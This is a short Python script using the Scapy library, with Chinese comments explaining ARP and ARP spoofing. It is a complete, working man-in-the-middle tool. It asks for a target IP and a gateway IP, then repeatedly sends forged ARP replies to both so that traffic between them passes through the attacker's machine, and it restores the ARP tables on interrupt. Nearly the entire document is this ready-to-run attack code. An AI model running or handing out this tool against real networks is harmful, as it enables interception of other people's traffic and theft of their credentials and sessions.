"""
arp分为广播和响应，广播用于寻找网关的MAC，响应是网关告诉广播者自己的MAC
arp欺骗：不停向某人回复自己的内网IP是网关，从而让局域网与互联网通讯时
被欺骗方不经过真正的网关的MAC地址通信，而经过欺骗方的MAC地址通信
"""
import scapy.all as scapy
import time
interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")

def spoof(target_ip, gateway_ip):
    '''
    向target_ip发布ARP响应，让本机的mac地址成为网关ip的mac地址
    :param target_ip: 被欺骗方的IP
    :param gateway_ip: 欺骗网关IP
    :return:
    '''
    # op=2表示arp报文为响应报文，op=1表示广播
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

try:
    while True:
        # 修改target的ARP表。告诉target，我是网关 target发的所有东西都只会经过我
        spoof(ip_target, ip_gateway)
        # 修改网关的ARP表。告诉真网关，我是target 真网关传回给target的所有东西都只会经过我
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt:
    # 恢复网关的arp表
    restore(ip_gateway, ip_target)
    # 回复target的arp表
    restore(ip_target, ip_gateway)